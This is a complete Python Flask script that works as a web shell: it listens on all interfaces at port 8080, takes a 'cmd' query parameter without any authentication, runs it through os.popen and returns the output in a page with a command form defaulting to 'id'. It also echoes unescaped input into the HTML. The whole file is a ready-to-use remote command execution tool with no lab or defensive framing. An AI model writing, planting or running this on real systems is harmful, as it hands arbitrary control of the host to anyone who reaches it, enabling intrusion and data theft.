#!/usr/bin/env python3
import os
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd')
    output = ""
    if cmd:
        output = os.popen(cmd).read()
    return f'''
    <pre>{output}</pre>
    <form>
        <input type="text" name="cmd" value="{cmd or 'id'}" style="width:70%">
        <button type="submit">Run</button>
    </form>
    '''

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)